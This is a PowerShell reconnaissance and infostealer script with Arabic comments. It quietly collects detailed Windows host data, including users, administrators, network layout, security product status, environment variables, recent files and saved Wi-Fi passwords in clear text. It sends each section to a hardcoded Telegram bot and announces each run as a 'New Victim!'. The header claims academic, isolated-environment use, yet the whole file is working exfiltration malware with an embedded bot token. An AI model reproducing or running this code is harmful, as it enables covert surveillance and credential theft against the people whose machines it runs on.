<#
.SYNOPSIS
    Advanced Windows Reconnaissance Script
.DESCRIPTION
    جمع شامل لمعلومات النظام وإرسالها إلى تيليجرام
.NOTES
    للاستخدام الأكاديمي فقط - بيئة معزولة
#>

# ============================================================
# الإعدادات
# ============================================================
$TELEGRAM_TOKEN = "8859552294:AAGwCO7PS_lojWxacrmUcaeyTPSCs7BLXs4"
$TELEGRAM_CHAT_ID = "5372717005"

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ============================================================
# دوال الإرسال
# ============================================================
function Send-TG {
    param([string]$Message)
    try {
        $url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage"
        $body = @{
            chat_id = $TELEGRAM_CHAT_ID
            text = $Message
            parse_mode = "HTML"
        }
        Invoke-RestMethod -Uri $url -Method Post -Body $body | Out-Null
    } catch {}
}

function Send-Section {
    param([string]$Title, [string[]]$Data)
    $text = "<b>$Title</b>`n" + ($Data -join "`n")
    if ($text.Length -gt 4000) {
        $text = $text.Substring(0, 4000) + "..."
    }
    Send-TG -Message $text
    Start-Sleep -Milliseconds 500
}

# ============================================================
# إشعار البدء
# ============================================================
Send-TG -Message "🔴 <b>New Victim!</b>`n🖥️ PC: $env:COMPUTERNAME`n👤 User: $env:USERNAME`n⏰ $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"

# ============================================================
# 1. معلومات النظام
# ============================================================
$r = @()
$os = Get-CimInstance Win32_OperatingSystem
$r += "PC: $env:COMPUTERNAME"
$r += "User: $env:USERNAME"
$r += "Domain: $env:USERDOMAIN"
$r += "OS: $($os.Caption)"
$r += "Version: $($os.Version)"
$r += "Build: $($os.BuildNumber)"
$r += "Arch: $env:PROCESSOR_ARCHITECTURE"
$r += "Install: $($os.InstallDate)"
$r += "Last Boot: $($os.LastBootUpTime)"
Send-Section -Title "[1] SYSTEM INFO" -Data $r

# ============================================================
# 2. العتاد
# ============================================================
$r = @()
$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
$r += "CPU: $($cpu.Name)"
$r += "Cores: $($cpu.NumberOfCores)"
$r += "Threads: $($cpu.NumberOfLogicalProcessors)"
$r += "Max Clock: $($cpu.MaxClockSpeed) MHz"
$cs = Get-CimInstance Win32_ComputerSystem
$r += "RAM: $([math]::Round($cs.TotalPhysicalMemory/1GB,2)) GB"
$r += "Manufacturer: $($cs.Manufacturer)"
$r += "Model: $($cs.Model)"
Send-Section -Title "[2] HARDWARE" -Data $r

# ============================================================
# 3. اللوحة الأم والـ BIOS
# ============================================================
$r = @()
$bb = Get-CimInstance Win32_BaseBoard
$r += "Motherboard: $($bb.Manufacturer) $($bb.Product)"
$bios = Get-CimInstance Win32_BIOS
$r += "BIOS: $($bios.Manufacturer)"
$r += "BIOS Version: $($bios.SMBIOSBIOSVersion)"
$r += "Serial: $($bios.SerialNumber)"
Send-Section -Title "[3] MOTHERBOARD & BIOS" -Data $r

# ============================================================
# 4. الأقراص
# ============================================================
$r = @()
Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | ForEach-Object {
    $r += "$($_.DeviceID) Total: $([math]::Round($_.Size/1GB,2))GB Free: $([math]::Round($_.FreeSpace/1GB,2))GB"
}
Get-CimInstance Win32_DiskDrive | ForEach-Object {
    $r += "Physical: $($_.Model) | $([math]::Round($_.Size/1GB,2))GB"
}
Send-Section -Title "[4] DISKS" -Data $r

# ============================================================
# 5. كروت الشاشة
# ============================================================
$r = @()
Get-CimInstance Win32_VideoController | ForEach-Object {
    $r += "GPU: $($_.Name)"
    $r += "Driver: $($_.DriverVersion)"
    $r += "Resolution: $($_.CurrentHorizontalResolution)x$($_.CurrentVerticalResolution)"
}
Send-Section -Title "[5] GPU" -Data $r

# ============================================================
# 6. الشاشات
# ============================================================
$r = @()
Get-CimInstance Win32_DesktopMonitor | ForEach-Object {
    $r += "Monitor: $($_.Name) | $($_.ScreenWidth)x$($_.ScreenHeight)"
}
Send-Section -Title "[6] MONITORS" -Data $r

# ============================================================
# 7. كروت الشبكة
# ============================================================
$r = @()
Get-NetAdapter | ForEach-Object {
    $r += "$($_.Name) | Status: $($_.Status) | MAC: $($_.MacAddress) | Speed: $($_.LinkSpeed)"
}
Send-Section -Title "[7] NETWORK ADAPTERS" -Data $r

# ============================================================
# 8. عناوين IP
# ============================================================
$r = @()
Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | ForEach-Object {
    $r += "IP: $($_.IPAddress)/$($_.PrefixLength) | $($_.InterfaceAlias)"
}
Get-NetIPAddress -AddressFamily IPv6 | Where-Object { $_.IPAddress -notmatch '^fe80|^::1' } | ForEach-Object {
    $r += "IPv6: $($_.IPAddress) | $($_.InterfaceAlias)"
}
Send-Section -Title "[8] IP ADDRESSES" -Data $r

# ============================================================
# 9. البوابة والـ DNS
# ============================================================
$r = @()
Get-NetRoute -DestinationPrefix '0.0.0.0/0' | ForEach-Object {
    $r += "Gateway: $($_.NextHop) | $($_.InterfaceAlias)"
}
Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object { $_.ServerAddresses } | ForEach-Object {
    $r += "DNS: $($_.ServerAddresses -join ', ')"
}
Send-Section -Title "[9] GATEWAY & DNS" -Data $r

# ============================================================
# 10. Wi-Fi Profiles
# ============================================================
$r = @()
try {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        $r += "WiFi: $name"
    }
} catch { $r += "WiFi: N/A" }
Send-Section -Title "[10] WIFI PROFILES" -Data $r

# ============================================================
# 11. Wi-Fi Passwords (يحتاج Admin)
# ============================================================
$r = @()
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        $key = netsh wlan show profile name="$name" key=clear | Select-String "Key Content"
        if ($key) {
            $r += "$name : $($key.ToString().Split(':')[1].Trim())"
        }
    }
    if ($r.Count -eq 0) { $r += "Admin required or no passwords" }
} catch { $r += "Admin required" }
Send-Section -Title "[11] WIFI PASSWORDS" -Data $r

# ============================================================
# 12. الاتصالات النشطة
# ============================================================
$r = @()
Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -notmatch '127.0.0.1|::1' } | Select-Object -First 30 | ForEach-Object {
    $proc = (Get-Process -Id $_.OwningProcess).ProcessName
    $r += "$($_.RemoteAddress):$($_.RemotePort) | $proc"
}
Send-Section -Title "[12] ACTIVE CONNECTIONS" -Data $r

# ============================================================
# 13. المنافذ المفتوحة
# ============================================================
$r = @()
Get-NetTCPConnection -State Listen | Select-Object -First 30 | ForEach-Object {
    $proc = (Get-Process -Id $_.OwningProcess).ProcessName
    $r += "Port: $($_.LocalPort) | $proc"
}
Send-Section -Title "[13] OPEN PORTS" -Data $r

# ============================================================
# 14. جدول التوجيه
# ============================================================
$r = @()
Get-NetRoute -AddressFamily IPv4 | Select-Object -First 20 | ForEach-Object {
    $r += "$($_.DestinationPrefix) | $($_.NextHop)"
}
Send-Section -Title "[14] ROUTING TABLE" -Data $r

# ============================================================
# 15. ARP Table (الأجهزة في الشبكة)
# ============================================================
$r = @()
Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Unreachable' -and $_.IPAddress -ne '127.0.0.1' } | ForEach-Object {
    $r += "IP: $($_.IPAddress) | MAC: $($_.LinkLayerAddress)"
}
Send-Section -Title "[15] LAN DEVICES" -Data $r

# ============================================================
# 16. المستخدمين
# ============================================================
$r = @()
Get-LocalUser | ForEach-Object {
    $r += "User: $($_.Name) | Enabled: $($_.Enabled) | LastLogon: $($_.LastLogon)"
}
Send-Section -Title "[16] USER ACCOUNTS" -Data $r

# ============================================================
# 17. المديرين
# ============================================================
$r = @()
Get-LocalGroupMember -Group Administrators | ForEach-Object {
    $r += "Admin: $($_.Name)"
}
Send-Section -Title "[17] ADMINISTRATORS" -Data $r

# ============================================================
# 18. المجموعات
# ============================================================
$r = @()
Get-LocalGroup | ForEach-Object {
    $r += "Group: $($_.Name)"
}
Send-Section -Title "[18] LOCAL GROUPS" -Data $r

# ============================================================
# 19. العمليات النشطة
# ============================================================
$r = @()
Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.ProcessName) | PID: $($_.Id) | CPU: $([math]::Round($_.CPU,2)) | RAM: $([math]::Round($_.WorkingSet64/1MB,2))MB"
}
Send-Section -Title "[19] TOP PROCESSES" -Data $r

# ============================================================
# 20. الخدمات النشطة
# ============================================================
$r = @()
Get-Service | Where-Object { $_.Status -eq 'Running' } | Select-Object -First 40 | ForEach-Object {
    $r += "$($_.Name) | $($_.DisplayName)"
}
Send-Section -Title "[20] RUNNING SERVICES" -Data $r

# ============================================================
# 21. البرامج المثبتة
# ============================================================
$r = @()
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Where-Object { $_.DisplayName } | Select-Object -First 40 | ForEach-Object {
    $r += "$($_.DisplayName) v$($_.DisplayVersion)"
}
Send-Section -Title "[21] INSTALLED SOFTWARE" -Data $r

# ============================================================
# 22. Windows Defender
# ============================================================
$r = @()
$d = Get-MpComputerStatus
$r += "Real-Time: $($d.RealTimeProtectionEnabled)"
$r += "Antivirus: $($d.AntivirusEnabled)"
$r += "Behavior: $($d.BehaviorMonitorEnabled)"
$r += "Tamper: $($d.IsTamperProtected)"
$r += "Last Update: $($d.AntivirusSignatureLastUpdated)"
Send-Section -Title "[22] DEFENDER" -Data $r

# ============================================================
# 23. الجدار الناري
# ============================================================
$r = @()
Get-NetFirewallProfile | ForEach-Object {
    $r += "$($_.Name): Enabled=$($_.Enabled)"
}
Send-Section -Title "[23] FIREWALL" -Data $r

# ============================================================
# 24. Chrome History
# ============================================================
$r = @()
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (Test-Path $chrome) {
    $r += "Chrome: EXISTS"
    $r += "Size: $([math]::Round((Get-Item $chrome).Length/1KB,2)) KB"
    $r += "Last Modified: $((Get-Item $chrome).LastWriteTime)"
} else { $r += "Chrome: Not installed" }
Send-Section -Title "[24] CHROME" -Data $r

# ============================================================
# 25. Edge History
# ============================================================
$r = @()
$edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
if (Test-Path $edge) {
    $r += "Edge: EXISTS"
    $r += "Size: $([math]::Round((Get-Item $edge).Length/1KB,2)) KB"
} else { $r += "Edge: Not installed" }
Send-Section -Title "[25] EDGE" -Data $r

# ============================================================
# 26. Firefox
# ============================================================
$r = @()
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    $r += "Firefox: EXISTS"
    Get-ChildItem $ff | ForEach-Object { $r += "Profile: $($_.Name)" }
} else { $r += "Firefox: Not installed" }
Send-Section -Title "[26] FIREFOX" -Data $r

# ============================================================
# 27. الملفات الحديثة
# ============================================================
$r = @()
Get-ChildItem "$env:USERPROFILE\Recent" | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.Name)"
}
Send-Section -Title "[27] RECENT FILES" -Data $r

# ============================================================
# 28. مجلدات المستخدم
# ============================================================
$r = @()
Get-ChildItem $env:USERPROFILE -Directory | ForEach-Object {
    $r += "$($_.Name)"
}
Send-Section -Title "[28] USER FOLDERS" -Data $r

# ============================================================
# 29. برامج بدء التشغيل
# ============================================================
$r = @()
Get-CimInstance Win32_StartupCommand | ForEach-Object {
    $r += "$($_.Name) | $($_.Command)"
}
Send-Section -Title "[29] STARTUP PROGRAMS" -Data $r

# ============================================================
# 30. المهام المجدولة
# ============================================================
$r = @()
Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' } | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.TaskName) | $($_.TaskPath)"
}
Send-Section -Title "[30] SCHEDULED TASKS" -Data $r

# ============================================================
# 31. التحديثات المثبتة
# ============================================================
$r = @()
Get-HotFix | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.HotFixID) | $($_.Description) | $($_.InstalledOn)"
}
Send-Section -Title "[31] WINDOWS UPDATES" -Data $r

# ============================================================
# 32. متغيرات البيئة
# ============================================================
$r = @()
Get-ChildItem Env: | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.Name)=$($_.Value)"
}
Send-Section -Title "[32] ENVIRONMENT" -Data $r

# ============================================================
# 33. المنافذ UDP
# ============================================================
$r = @()
Get-NetUDPEndpoint | Select-Object -First 20 | ForEach-Object {
    $r += "UDP Port: $($_.LocalPort)"
}
Send-Section -Title "[33] UDP PORTS" -Data $r

# ============================================================
# 34. SMB Shares
# ============================================================
$r = @()
Get-SmbShare | ForEach-Object {
    $r += "$($_.Name) | $($_.Path)"
}
Send-Section -Title "[34] SMB SHARES" -Data $r

# ============================================================
# 35. الطابعات
# ============================================================
$r = @()
Get-Printer | ForEach-Object {
    $r += "$($_.Name) | $($_.DriverName)"
}
Send-Section -Title "[35] PRINTERS" -Data $r

# ============================================================
# 36. DNS Cache
# ============================================================
$r = @()
Get-DnsClientCache | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.Entry) | $($_.Data)"
}
Send-Section -Title "[36] DNS CACHE" -Data $r

# ============================================================
# 37. جلسات الشبكة
# ============================================================
$r = @()
net session 2>$null | Out-String | ForEach-Object { $r += $_ }
Send-Section -Title "[37] NET SESSIONS" -Data $r

# ============================================================
# 38. معلومات الوقت والمنطقة الزمنية
# ============================================================
$r = @()
$r += "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$r += "Timezone: $((Get-TimeZone).DisplayName)"
$r += "UTC Offset: $((Get-TimeZone).BaseUtcOffset)"
Send-Section -Title "[38] TIME & TIMEZONE" -Data $r

# ============================================================
# 39. آخر تسجيلات الدخول
# ============================================================
$r = @()
Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object { $_.Id -eq 4624 } | Select-Object -First 20 | ForEach-Object {
    $r += "$($_.TimeCreated) | Login Event"
}
if ($r.Count -eq 0) { $r += "Admin required" }
Send-Section -Title "[39] LAST LOGINS" -Data $r

# ============================================================
# 40. USB Devices History
# ============================================================
$r = @()
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*" | Select-Object -First 10 | ForEach-Object {
    $r += "$($_.PSChildName)"
}
Send-Section -Title "[40] USB DEVICES" -Data $r

# ============================================================
# 41. Installed Drivers
# ============================================================
$r = @()
Get-CimInstance Win32_SystemDriver | Where-Object { $_.State -eq 'Running' } | Select-Object -First 30 | ForEach-Object {
    $r += "$($_.Name) | $($_.DisplayName)"
}
Send-Section -Title "[41] RUNNING DRIVERS" -Data $r

# ============================================================
# 42. الملفات المؤقتة
# ============================================================
$r = @()
$tempSize = (Get-ChildItem $env:TEMP -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
$r += "Temp Folder: $([math]::Round($tempSize/1MB,2)) MB"
$r += "Temp Path: $env:TEMP"
Send-Section -Title "[42] TEMP FILES" -Data $r

# ============================================================
# 43. برامج الحماية المثبتة
# ============================================================
$r = @()
Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct | ForEach-Object {
    $r += "$($_.displayName) | State: $($_.productState)"
}
Send-Section -Title "[43] ANTIVIRUS PRODUCTS" -Data $r

# ============================================================
# 44. معلومات إضافية
# ============================================================
$r = @()
$r += "Logged Users: $((Get-CimInstance Win32_ComputerSystem).UserName)"
$r += "System Type: $((Get-CimInstance Win32_ComputerSystem).SystemType)"
$r += "Boot Time: $((Get-CimInstance Win32_OperatingSystem).LastBootUpTime)"
$r += "Total RAM: $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)) GB"
Send-Section -Title "[44] ADDITIONAL INFO" -Data $r

# ============================================================
# إشعار الانتهاء
# ============================================================
Send-TG -Message "✅ <b>Recon Complete!</b>`n🖥️ $env:COMPUTERNAME`n⏰ $(Get-Date -Format 'HH:mm:ss')"